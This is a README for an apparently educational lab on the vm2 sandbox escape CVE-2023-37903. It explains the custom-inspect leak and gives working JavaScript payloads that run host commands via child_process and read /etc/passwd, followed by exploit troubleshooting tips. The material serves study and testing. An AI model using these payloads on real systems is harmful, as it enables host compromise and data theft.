# vm2 Sandbox Escape Lab (CVE-2023-37903)

## Overview

This educational lab demonstrates the **CVE-2023-37903** vulnerability in vm2@3.9.19, which allows attackers to escape the sandbox and execute arbitrary code on the host system.

## How the Vulnerability Works

The vulnerability exploits Node.js's custom inspect function mechanism:

1. **Custom Inspect Function**: Node.js allows objects to define custom inspect functions via `Symbol.for('nodejs.util.inspect.custom')`
2. **Cross-Realm Access**: This symbol is available across different execution contexts
3. **Function Leakage**: The `inspect` function from the host context can be leaked into the sandbox
4. **Host Access**: The leaked `inspect` function has access to the host's `process` object
5. **Sandbox Escape**: By triggering `WebAssembly.compileStreaming()` with a malformed object, the custom inspect function is executed, allowing sandbox escape

### Example Payloads

#### Basic Sandbox Escape
```javascript
const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');

obj = {
    [customInspectSymbol]: (depth, opt, inspect) => {
        inspect.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
    },
    valueOf: undefined,
    constructor: undefined,
}

WebAssembly.compileStreaming(obj).catch(()=>{});
```

#### Command Execution
```javascript
const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');

obj = {
    [customInspectSymbol]: (depth, opt, inspect) => {
        return inspect.constructor('return process')().mainModule.require('child_process').execSync('whoami');
    },
    valueOf: undefined,
    constructor: undefined,
}

WebAssembly.compileStreaming(obj).catch(()=>{});
```

#### File System Access
```javascript
const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');

obj = {
    [customInspectSymbol]: (depth, opt, inspect) => {
        return inspect.constructor('return process')().mainModule.require('fs').readFileSync('/etc/passwd', 'utf8');
    },
    valueOf: undefined,
    constructor: undefined,
}

WebAssembly.compileStreaming(obj).catch(()=>{});
```

## Common Issues & Solutions

### "Identifier already declared" Error

**Why this happens:**
- vm2 sandbox maintains a **persistent global context** between executions
- Variables declared with `const` or `let` remain in the global scope
- `Symbol.for()` always returns the same symbol across executions
- The sandbox doesn't automatically clear variables between `vm.run()` calls

**Technical Explanation:**
```javascript
// First execution:
const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
// ✅ Works fine

// Second execution (same sandbox):
const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
// ❌ Error: Identifier 'customInspectSymbol' has already been declared
```

**Why clearing doesn't work:**
- `delete global.customInspectSymbol` fails because `const` variables can't be deleted
- vm2 sandbox has limitations on global variable manipulation
- The sandbox context persists until the VM instance is destroyed

**Solutions:**
1. **Restart the server** - This creates a fresh VM instance
2. **Use different variable names** - Each execution uses unique names
3. **Use IIFE scope** - Wrap code in `(() => { ... })()` to avoid global scope
4. **Use function wrappers** - Encapsulate code in functions

### 🔧 Practical Workarounds

**Method 1: Dynamic Variable Names**
```javascript
const timestamp = Date.now();
const dynamicSymbol = Symbol.for('nodejs.util.inspect.custom');
// Use timestamp to ensure uniqueness
```

**Method 2: IIFE Scope**
```javascript
(() => {
    const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
    // Your payload here
})();
```

**Method 3: Function Wrapper**
```javascript
function executePayload() {
    const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
    // Your payload here
}
executePayload();
```

**Why it shows success but doesn't execute:**
1. **Scope issue**: `obj` is not properly declared
2. **Execution context**: The custom inspect function might not be triggered
3. **Error handling**: `WebAssembly.compileStreaming()` catches errors silently

### 🛠️ Troubleshooting Guide

**Problem**: Getting "Identifier already declared" error repeatedly
**Root Cause**: vm2 sandbox persistence
**Best Solution**: Restart the server

**Problem**: Sandbox management methods don't work
**Explanation**: vm2 sandbox limitations prevent variable deletion
**Solution**: Use server restart or IIFE scope

**Problem**: Exploit works once but fails on retry
**Cause**: Global variable conflicts in persistent sandbox
**Fix**: Always restart server between tests

**Problem**: Different payloads interfere with each other
**Reason**: Shared global scope in vm2 sandbox
**Workaround**: Use unique variable names or restart server



## References

- [CVE-2023-37903 Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-37903)
- [vm2 GitHub Repository](https://github.com/patriksimek/vm2)
- [Node.js util.inspect.custom Documentation](https://nodejs.org/api/util.html#utilinspectcustom)
- [WebAssembly.compileStreaming Documentation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WebAssembly/compileStreaming)


## License

Apache License 2.0 - See LICENSE file for details

**Remember**: This lab is for educational purposes only. Use responsibly and ethically!
